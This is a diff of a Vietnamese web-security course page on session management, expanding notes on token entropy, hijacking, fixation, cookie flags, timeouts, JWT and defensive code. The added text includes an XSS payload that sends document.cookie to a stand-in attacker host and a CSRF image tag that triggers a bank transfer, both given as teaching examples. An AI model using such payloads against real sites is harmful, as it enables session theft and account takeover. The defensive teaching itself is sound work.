@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Chương 5: Session Management — Hieu Nguyen</title>
-  <meta name="description" content="Session token, fixation, timeout, cookie flags, JWT vs server session.">
+  <title>Chương 5: Session Management — Quản lý phiên — Hieu Nguyen</title>
+  <meta name="description" content="Chương 5: Session Management — Quản lý phiên — Web Security notes.">
   <link rel="icon" href="../../../favicon.svg" type="image/svg+xml">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Outfit:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -40,68 +40,342 @@
         <span>›</span>
         <span>05. Session</span>
       </div>
-      <h1>Chương 5: Session Management</h1>
-      <p class="lede">Session là chìa sau khi đã chứng minh danh tính. Làm mất chìa thì MFA cũng vô nghĩa.</p>
-      <div class="docs-meta">
-        <span><strong>Tác giả:</strong> Hieu Nguyen (Ryan)</span>
-        <span><strong>Phần:</strong> II — Auth</span>
-        <span><strong>Cập nhật:</strong> Aug 2026</span>
-      </div>
-      <h2 id="khai-niem">Khái niệm</h2>
-<p>Sau login, server nhớ bạn bằng <strong>session token</strong> (cookie hoặc header). Token phải khó đoán, gắn user, và chết đúng lúc.</p>
-<h2 id="token">Yêu cầu bảo mật cho token</h2>
+      <div id="top"></div>
+<header><h1>Chương 5: Session Management — Quản lý phiên</h1></header>
+<h2 id="khái-niệm">Khái niệm</h2>
+<p>HTTP là stateless — server không nhớ ai đã đăng nhập. <strong>Session</strong> là cơ chế tạo ra &quot;trạng thái&quot; giữa các requests. Sau khi login, server tạo một <strong>session token</strong> (mã phiên), gửi về client qua cookie, và dùng token đó để xác định người dùng trong các request tiếp theo.</p>
+<p><strong>Mức độ nguy hiểm:</strong> Cao — Đánh cắp session = chiếm quyền tài khoản mà không cần password.</p>
+<hr>
+<h2 id="cách-hoạt-động">Cách hoạt động</h2>
+<pre><code class="language-text">1. User POST /login với credentials
+2. Server xác thực, tạo session:
+   session_id = generate_random_token()
+   store_in_db(session_id, user_id, expires_at)
+3. Server gửi cookie:
+   Set-Cookie: session=session_id; HttpOnly; Secure; SameSite=Strict
+4. Các request tiếp theo:
+   Cookie: session=session_id
+   Server lookup session_id trong DB → biết đây là user nào
+</code></pre>
+<hr>
+<h2 id="session-token--yêu-cầu-bảo-mật">Session Token — Yêu cầu bảo mật</h2>
+<p>Một session token tốt phải đảm bảo:</p>
 <ul>
-        <li>Entropy đủ (CSPRNG), không phải user-id encode.</li>
-        <li>Rotate lúc login (chống session fixation).</li>
-        <li>Invalidate lúc logout, đổi password, MFA xong.</li>
-        <li>Không nhét trong URL / Referer / log.</li>
-      </ul>
-<h2 id="tan-cong">Lớp sự cố thường gặp</h2>
-<h3 id="hijack">Session hijacking</h3>
-<p>Token lộ: XSS đọc cookie thiếu HttpOnly, HTTP không Secure, log access, XSS stored. Phòng: flag cookie + CSP + HTTPS.</p>
-<h3 id="fix">Session fixation</h3>
-<p>Attacker gài token trước login; nếu app không đổi token khi authenticate thì phiên đó thành của victim. Fix: luôn phát token mới sau login.</p>
-<h3 id="weak">Token yếu</h3>
-<p>Tăng dần, timestamp, MD5(email). Scanner và log là đủ để nhận ra — không cần “bẻ”.</p>
-<h2 id="cookie">Cookie attributes</h2>
-<p>HttpOnly, Secure, SameSite, Domain/Path hẹp, Max-Age hợp lý — xem Chương 2. Session cookie Domain=<code>.company.com</code> quá rộng thì mọi subdomain chia phiên.</p>
-<h2 id="timeout">Timeout</h2>
-<ul>
-        <li>Idle timeout: không hoạt động thì chết.</li>
-        <li>Absolute timeout: dù đang dùng cũng phải re-auth (admin).</li>
-        <li>Logout server-side: xóa store, không chỉ xóa cookie client.</li>
-      </ul>
-<h2 id="jwt-vs">JWT vs session server-side</h2>
-<p>Session store (Redis) revoke được ngay. JWT stateless khó revoke trừ denylist/short TTL. Hybrid: access ngắn + refresh rotate.</p>
-<h2 id="phat-hien">Cách phát hiện</h2>
-<ul>
-        <li>Set-Cookie lúc login có đủ flag không.</li>
-        <li>Login có Set-Cookie mới hay giữ cookie cũ.</li>
-        <li>Logout còn dùng lại token được không (lab của bạn).</li>
-      </ul>
-<h2 id="devops">Góc nhìn DevOps</h2>
-<p>Sticky session vs Redis shared. TLS terminate ở Ingress thì cookie Secure vẫn set được nếu app tin <code>X-Forwarded-Proto</code> từ proxy tin cậy. Session store không public Service.</p>
-<h2 id="tom-tat">Tóm tắt</h2>
-<ul>
-        <li>Rotate session khi login.</li>
-        <li>Revoke lúc logout/đổi mật khẩu.</li>
-        <li>Cookie flags là lớp rẻ.</li>
-        <li>JWT ngắn hạn hoặc có cửa revoke.</li>
-      </ul>
-<h2 id="on-tap">Câu hỏi ôn tập</h2>
-<ol>
-        <li>Fixation khác hijacking chỗ nào?</li>
-        <li>Vì sao Domain cookie quá rộng nguy hiểm?</li>
-        <li>Idle vs absolute timeout?</li>
-        <li>Khi nào Redis session hơn JWT thuần?</li>
-        <li>Logout chỉ xóa cookie client thì còn gì?</li>
-      </ol>
+<li><strong>Entropy cao:</strong> Ít nhất 128 bits random, không đoán được</li>
+<li><strong>Unique:</strong> Không bao giờ reuse</li>
+<li><strong>Không chứa thông tin:</strong> Không encode user_id vào token</li>
+<li><strong>Có expiry:</strong> Tự hết hạn sau thời gian nhất định</li>
+<li><strong>Invalidated khi logout:</strong> Xóa ở server-side</li>
+</ul>
+<p><strong>Ví dụ token xấu:</strong></p>
+<pre><code class="language-text">session=user_id_1337                    ← chứa user ID
+session=1609459200_admin                ← timestamp + username
+session=e10adc3949ba59abbe56e057f20f883e  ← MD5 của password
+session=00001338                        ← sequential, predictable
+</code></pre>
+<p><strong>Ví dụ token tốt:</strong></p>
+<pre><code class="language-text">session=kX9mP2nQ4rT7vY1zA3bC6eF8hJ0lM5oR  ← 32 bytes random
+</code></pre>
+<hr>
+<h2 id="các-loại-tấn-công-session">Các loại tấn công Session</h2>
+<h3 id="1-session-hijacking-đánh-cắp-phiên">1. Session Hijacking (Đánh cắp phiên)</h3>
+<p>Hacker đánh cắp session token của người dùng hợp lệ.</p>
+<p><strong>Cách đánh cắp:</strong></p>
+<pre><code class="language-text">a. XSS: Inject script để đọc cookie
+   document.cookie → lấy session token
+   (Ngăn chặn bằng HttpOnly)
 
-      <div class="docs-tags">
-        <span class="docs-tag">session</span>
-        <span class="docs-tag">cookies</span>
-        <span class="docs-tag">jwt</span>
-      </div>
+b. Network sniffing: Đọc traffic qua HTTP (không HTTPS)
+   (Ngăn chặn bằng Secure cookie + HTTPS)
+
+c. Log files: Token trong URL bị log
+   GET /app?session=abc123
+   → Apache/Nginx log lưu token trong plaintext
+   (Ngăn chặn bằng không để token trong URL)
+
+d. Man-in-the-Middle: Intercept traffic
+   (Ngăn chặn bằng HTTPS + HSTS)
+</code></pre>
+<h3 id="2-session-fixation-cố-định-phiên">2. Session Fixation (Cố định phiên)</h3>
+<p>Hacker ép victim dùng session token do hacker kiểm soát.</p>
+<pre><code class="language-text">Kịch bản:
+1. Hacker tạo session: GET /login → session=HACKER_TOKEN
+2. Hacker gửi link cho victim: 
+   https://example.com/login?session=HACKER_TOKEN
+3. Victim đăng nhập với token đó
+4. Server upgrade token nhưng KHÔNG đổi session ID
+   → Hacker và victim dùng cùng session ID
+5. Hacker dùng HACKER_TOKEN → đã có quyền của victim
+</code></pre>
+<p><strong>Phòng chống:</strong> Luôn tạo session ID mới sau khi login thành công.</p>
+<pre><code class="language-python">def login():
+    if verify_credentials(username, password):
+        # Xóa session cũ, tạo session mới
+        session.clear()
+        new_session_id = generate_secure_token()
+        session[&#x27;user_id&#x27;] = user.id
+        # Flask tự động gán session ID mới
+        return redirect(&#x27;/dashboard&#x27;)
+</code></pre>
+<h3 id="3-weak-session-tokens--token-yếu">3. Weak Session Tokens — Token Yếu</h3>
+<p><strong>Sequential tokens:</strong></p>
+<pre><code class="language-text">User 1: session=1000
+User 2: session=1001
+User 3: session=1002
+→ Hacker có session=1001, thử 1000, 1002, 1003...
+</code></pre>
+<p><strong>Predictable tokens:</strong></p>
+<pre><code class="language-python"># SAI: dùng timestamp làm token
+import time
+token = str(int(time.time()))  # &quot;1609459200&quot; → predictable
+
+# ĐÚNG: dùng secrets module
+import secrets
+token = secrets.token_hex(32)  # 64-char hex string, 256-bit entropy
+</code></pre>
+<p><strong>PHP session weakness:</strong></p>
+<pre><code class="language-php">// PHP&#x27;s session_id() dùng MD5(IP + timestamp) trong phiên bản cũ
+// → predictable nếu biết IP và thời gian login
+
+// Dùng session_regenerate_id(true) sau login
+session_start();
+if (login_success) {
+    session_regenerate_id(true);  // Tạo ID mới, xóa ID cũ
+    $_SESSION[&#x27;user_id&#x27;] = $user_id;
+}
+</code></pre>
+<h3 id="4-session-cookie-theft-qua-xss">4. Session Cookie Theft qua XSS</h3>
+<pre><code class="language-javascript">// Payload XSS để đánh cắp cookie
+&lt;script&gt;
+  fetch(&#x27;https://attacker.com/steal?cookie=&#x27; + document.cookie);
+&lt;/script&gt;
+
+// Nếu HttpOnly: cookie không đọc được
+// Nhưng CSRF vẫn hoạt động vì browser tự gửi cookie
+</code></pre>
+<h3 id="5-csrf--liên-quan-session">5. CSRF — Liên quan Session</h3>
+<p>CSRF lợi dụng việc browser tự động gửi cookie trong mọi request. Chi tiết ở Chương 10.</p>
+<hr>
+<h2 id="cookie-attributes-chi-tiết">Cookie Attributes chi tiết</h2>
+<h3 id="httponly">HttpOnly</h3>
+<pre><code class="language-http">Set-Cookie: session=abc123; HttpOnly
+</code></pre>
+<ul>
+<li>JavaScript không đọc được cookie (<code>document.cookie</code> không trả về)</li>
+<li>Ngăn XSS đánh cắp session cookie</li>
+<li>Cookie vẫn tự động gửi kèm request</li>
+</ul>
+<h3 id="secure">Secure</h3>
+<pre><code class="language-http">Set-Cookie: session=abc123; Secure
+</code></pre>
+<ul>
+<li>Cookie chỉ gửi qua HTTPS</li>
+<li>Nếu user truy cập qua HTTP (bị redirect), cookie không bị gửi</li>
+<li>Phòng chống MITM và network sniffing</li>
+</ul>
+<h3 id="samesite">SameSite</h3>
+<pre><code class="language-http">Set-Cookie: session=abc123; SameSite=Strict
+Set-Cookie: session=abc123; SameSite=Lax
+Set-Cookie: session=abc123; SameSite=None; Secure
+</code></pre>
+<table><thead><tr><th>Giá trị</th><th>Cookie gửi khi</th><th>Use case</th></tr></thead><tbody><tr><td><code>Strict</code></td><td>Chỉ same-site requests</td><td>Bảo mật cao nhất, UX hạn chế</td></tr><tr><td><code>Lax</code></td><td>Same-site + top-level navigation</td><td>Cân bằng UX và security</td></tr><tr><td><code>None</code></td><td>Tất cả (kể cả cross-site)</td><td>Third-party cookies, cần Secure</td></tr></tbody></table>
+<p><strong>SameSite=Lax và CSRF:</strong></p>
+<pre><code class="language-text">Với SameSite=Lax, cookie gửi khi:
+✓ User click link: &lt;a href=&quot;https://bank.com/transfer&quot;&gt; → cookie gửi
+✓ Top-level navigation
+
+Nhưng KHÔNG gửi khi:
+✗ Cross-site POST form
+✗ Fetch/XHR requests
+✗ Iframe loads
+
+→ Chống được CSRF qua hidden form, nhưng không chống được qua link click
+</code></pre>
+<h3 id="domain-và-path">Domain và Path</h3>
+<pre><code class="language-http">Set-Cookie: session=abc123; Domain=.example.com; Path=/
+</code></pre>
+<ul>
+<li><code>Domain=.example.com</code>: cookie áp dụng cho tất cả subdomain</li>
+<li><code>Path=/</code>: cookie gửi cho tất cả paths</li>
+<li>Nếu không set Domain: chỉ áp dụng cho domain hiện tại (an toàn hơn)</li>
+</ul>
+<hr>
+<h2 id="session-timeout-và-invalidation">Session Timeout và Invalidation</h2>
+<h3 id="absolute-timeout">Absolute Timeout</h3>
+<p>Session hết hạn sau thời gian tuyệt đối, dù user đang active:</p>
+<pre><code class="language-python">SESSION_LIFETIME = 3600  # 1 giờ
+session[&#x27;created_at&#x27;] = time.time()
+
+def check_session():
+    if time.time() - session[&#x27;created_at&#x27;] &gt; SESSION_LIFETIME:
+        session.clear()
+        return False
+    return True
+</code></pre>
+<h3 id="idle-timeout">Idle Timeout</h3>
+<p>Session hết hạn sau thời gian không hoạt động:</p>
+<pre><code class="language-python">SESSION_IDLE_TIMEOUT = 900  # 15 phút
+
+def update_activity():
+    session[&#x27;last_active&#x27;] = time.time()
+
+def check_idle():
+    if time.time() - session.get(&#x27;last_active&#x27;, 0) &gt; SESSION_IDLE_TIMEOUT:
+        session.clear()
+        return False
+    return True
+</code></pre>
+<h3 id="logout-đúng-cách">Logout đúng cách</h3>
+<pre><code class="language-python"># SAI: chỉ xóa cookie phía client
+def logout():
+    response = redirect(&#x27;/login&#x27;)
+    response.delete_cookie(&#x27;session&#x27;)  # Cookie bị xóa ở browser
+    return response  # Nhưng server-side session vẫn valid!
+
+# ĐÚNG: xóa cả server-side session
+def logout():
+    session_id = request.cookies.get(&#x27;session&#x27;)
+    if session_id:
+        delete_session_from_db(session_id)  # Xóa server-side
+    session.clear()
+    response = redirect(&#x27;/login&#x27;)
+    response.delete_cookie(&#x27;session&#x27;)
+    return response
+</code></pre>
+<hr>
+<h2 id="jwt-vs-server-side-sessions">JWT vs. Server-Side Sessions</h2>
+<table><thead><tr><th>Đặc điểm</th><th>Server-Side Session</th><th>JWT</th></tr></thead><tbody><tr><td>Lưu trữ</td><td>Server (DB/Redis)</td><td>Client (cookie/localStorage)</td></tr><tr><td>Invalidation</td><td>Dễ (xóa từ DB)</td><td>Khó (cần blacklist)</td></tr><tr><td>Scalability</td><td>Cần shared storage</td><td>Stateless</td></tr><tr><td>Security</td><td>Phụ thuộc vào token</td><td>Phụ thuộc vào signature</td></tr><tr><td>Size</td><td>Token nhỏ (ID only)</td><td>Token lớn (chứa payload)</td></tr></tbody></table>
+<p>JWT có nhiều gotchas về security — xem Chương 8.</p>
+<hr>
+<h2 id="ví-dụ-thực-tế-phân-tích-session-security">Ví dụ thực tế: Phân tích session security</h2>
+<pre><code class="language-bash"># Kiểm tra cookie attributes qua curl
+curl -I https://example.com/login -c cookies.txt
+
+# Response headers:
+Set-Cookie: session=abc123; Path=/; HttpOnly; Secure; SameSite=Lax
+
+# Kiểm tra:
+# ✓ HttpOnly - XSS không đánh cắp được
+# ✓ Secure - chỉ HTTPS
+# ✓ SameSite=Lax - giảm CSRF risk
+# ✗ Không có Expires - session cookie, xóa khi đóng tab
+# ✗ Không có Max-Age - không có idle timeout ở cookie level
+</code></pre>
+<hr>
+<h2 id="kịch-bản-tấn-công-session-riding">Kịch bản tấn công: Session Riding</h2>
+<pre><code class="language-text">1. Victim đăng nhập bank.com → có cookie: session=VICTIM_TOKEN
+2. Victim vào một trang web độc hại
+3. Trang độc hại có:
+   &lt;img src=&quot;https://bank.com/api/transfer?to=hacker&amp;amount=1000&quot;&gt;
+4. Browser tự động gửi request với VICTIM_TOKEN
+5. Bank không có CSRF protection → transfer thành công
+
+Nếu cookie có SameSite=Strict:
+→ Browser không gửi cookie với cross-site img load
+→ Transfer thất bại → hacker thất bại
+</code></pre>
+<hr>
+<h2 id="cách-phát-hiện">Cách phát hiện</h2>
+<pre><code class="language-text">□ Session token predictable hoặc sequential
+□ Session token không thay đổi sau login (session fixation risk)
+□ Session token không thay đổi sau privilege escalation
+□ Cookie thiếu HttpOnly → test: document.cookie trong console
+□ Cookie thiếu Secure → test qua HTTP
+□ Cookie không có SameSite → CSRF risk cao
+□ Logout không invalidate server-side session
+□ Session không expire sau idle period
+□ Multiple sessions allowed cùng lúc (không có concurrent session control)
+</code></pre>
+<hr>
+<h2 id="phòng-chống--checklist">Phòng chống — Checklist</h2>
+<pre><code class="language-python"># 1. Generate cryptographically random token
+import secrets
+session_id = secrets.token_urlsafe(32)
+
+# 2. Set cookie attributes đầy đủ
+response.set_cookie(
+    &#x27;session&#x27;,
+    session_id,
+    httponly=True,
+    secure=True,
+    samesite=&#x27;Strict&#x27;,
+    max_age=3600,
+    path=&#x27;/&#x27;
+)
+
+# 3. Regenerate session ID sau login
+def after_login(user):
+    old_data = dict(session)
+    session.clear()
+    session.regenerate()  # Tạo ID mới
+    session.update(old_data)
+    session[&#x27;user_id&#x27;] = user.id
+
+# 4. Invalidate server-side khi logout
+def logout():
+    db.sessions.delete(session.id)
+    session.clear()
+
+# 5. Check session validity mỗi request
+def before_request():
+    session_id = request.cookies.get(&#x27;session&#x27;)
+    if not db.sessions.get(session_id):
+        abort(401)
+</code></pre>
+<hr>
+<h2 id="góc-nhìn-devops">Góc nhìn DevOps</h2>
+<p><strong>Redis-backed sessions (scalable):</strong></p>
+<pre><code class="language-python"># Flask-Session với Redis backend
+from flask_session import Session
+import redis
+
+app.config[&#x27;SESSION_TYPE&#x27;] = &#x27;redis&#x27;
+app.config[&#x27;SESSION_REDIS&#x27;] = redis.from_url(&#x27;redis://redis:6379&#x27;)
+app.config[&#x27;PERMANENT_SESSION_LIFETIME&#x27;] = timedelta(hours=1)
+Session(app)
+</code></pre>
+<p><strong>Kubernetes: Session affinity khi cần:</strong></p>
+<pre><code class="language-yaml"># Ingress với session affinity (chỉ khi dùng server-side session)
+apiVersion: networking.k8s.io/v1
+kind: Ingress
+metadata:
+  annotations:
+    nginx.ingress.kubernetes.io/affinity: &quot;cookie&quot;
+    nginx.ingress.kubernetes.io/session-cookie-name: &quot;INGRESSCOOKIE&quot;
+    nginx.ingress.kubernetes.io/session-cookie-max-age: &quot;3600&quot;
+</code></pre>
+<p><strong>Logging và monitoring:</strong></p>
+<pre><code class="language-text">Log các sự kiện:
+- Login thành công/thất bại (với IP, user-agent)
+- Logout
+- Session expiry
+- Cùng session từ nhiều IP khác nhau → suspicious
+- Nhiều sessions của một user cùng lúc → suspicious
+
+Alert khi:
+- Session từ IP mới sau login → account takeover attempt
+- Login từ geo-location khác trong thời gian ngắn → impossible travel
+</code></pre>
+<hr>
+<h2 id="tóm-tắt">Tóm tắt</h2>
+<ul>
+<li>Session là cầu nối giữa stateless HTTP và stateful application.</li>
+<li>Session token phải: random, có entropy cao, unique, có expiry, invalidated khi logout.</li>
+<li>HttpOnly ngăn XSS đọc cookie; Secure ngăn sniffing; SameSite ngăn CSRF.</li>
+<li>Session fixation: luôn tạo session ID mới sau login.</li>
+<li>Server-side invalidation khi logout — không chỉ xóa cookie phía client.</li>
+<li>Idle timeout và absolute timeout đều cần thiết.</li>
+<li>Dùng Redis cho session storage trong môi trường distributed.</li>
+</ul>
+<hr>
+<h2 id="câu-hỏi-ôn-tập">Câu hỏi ôn tập</h2>
+<ol>
+<li>Sự khác nhau giữa session hijacking và session fixation là gì?</li>
+<li>Tại sao <code>logout()</code> chỉ xóa cookie phía client là không đủ?</li>
+<li>Cookie <code>SameSite=Lax</code> bảo vệ khỏi CSRF như thế nào? Và không bảo vệ khỏi gì?</li>
+<li>Khi nào nên dùng server-side sessions thay vì JWT? Trade-off là gì?</li>
+<li>Làm thế nào để phát hiện session từ IP &quot;không thể xảy ra&quot; (impossible travel)?</li>
+</ol>
       <div class="docs-pager">
         <a href="../04/">Previous · 04. Authentication</a>
         <a href="../06/">Next · 06. Access Control</a>
@@ -110,19 +384,32 @@
     <aside class="docs-toc">
       <div class="docs-toc-title">On this page</div>
       <nav>
-        <a href="#khai-niem">Khái niệm</a>
-        <a href="#token">Yêu cầu bảo mật cho token</a>
-        <a href="#tan-cong">Lớp sự cố thường gặp</a>
-        <a class="depth-3" href="#hijack">Session hijacking</a>
-        <a class="depth-3" href="#fix">Session fixation</a>
-        <a class="depth-3" href="#weak">Token yếu</a>
-        <a href="#cookie">Cookie attributes</a>
-        <a href="#timeout">Timeout</a>
-        <a href="#jwt-vs">JWT vs session server-side</a>
-        <a href="#phat-hien">Cách phát hiện</a>
-        <a href="#devops">Góc nhìn DevOps</a>
-        <a href="#tom-tat">Tóm tắt</a>
-        <a href="#on-tap">Câu hỏi ôn tập</a>
+        <a href="#khái-niệm">Khái niệm</a>
+        <a href="#cách-hoạt-động">Cách hoạt động</a>
+        <a href="#session-token--yêu-cầu-bảo-mật">Session Token — Yêu cầu bảo mật</a>
+        <a href="#các-loại-tấn-công-session">Các loại tấn công Session</a>
+        <a class="depth-3" href="#1-session-hijacking-đánh-cắp-phiên">1. Session Hijacking (Đánh cắp phiên)</a>
+        <a class="depth-3" href="#2-session-fixation-cố-định-phiên">2. Session Fixation (Cố định phiên)</a>
+        <a class="depth-3" href="#3-weak-session-tokens--token-yếu">3. Weak Session Tokens — Token Yếu</a>
+        <a class="depth-3" href="#4-session-cookie-theft-qua-xss">4. Session Cookie Theft qua XSS</a>
+        <a class="depth-3" href="#5-csrf--liên-quan-session">5. CSRF — Liên quan Session</a>
+        <a href="#cookie-attributes-chi-tiết">Cookie Attributes chi tiết</a>
+        <a class="depth-3" href="#httponly">HttpOnly</a>
+        <a class="depth-3" href="#secure">Secure</a>
+        <a class="depth-3" href="#samesite">SameSite</a>
+        <a class="depth-3" href="#domain-và-path">Domain và Path</a>
+        <a href="#session-timeout-và-invalidation">Session Timeout và Invalidation</a>
+        <a class="depth-3" href="#absolute-timeout">Absolute Timeout</a>
+        <a class="depth-3" href="#idle-timeout">Idle Timeout</a>
+        <a class="depth-3" href="#logout-đúng-cách">Logout đúng cách</a>
+        <a href="#jwt-vs-server-side-sessions">JWT vs. Server-Side Sessions</a>
+        <a href="#ví-dụ-thực-tế-phân-tích-session-security">Ví dụ thực tế: Phân tích session security</a>
+        <a href="#kịch-bản-tấn-công-session-riding">Kịch bản tấn công: Session Riding</a>
+        <a href="#cách-phát-hiện">Cách phát hiện</a>
+        <a href="#phòng-chống--checklist">Phòng chống — Checklist</a>
+        <a href="#góc-nhìn-devops">Góc nhìn DevOps</a>
+        <a href="#tóm-tắt">Tóm tắt</a>
+        <a href="#câu-hỏi-ôn-tập">Câu hỏi ôn tập</a>
       </nav>
     </aside>
   </div>
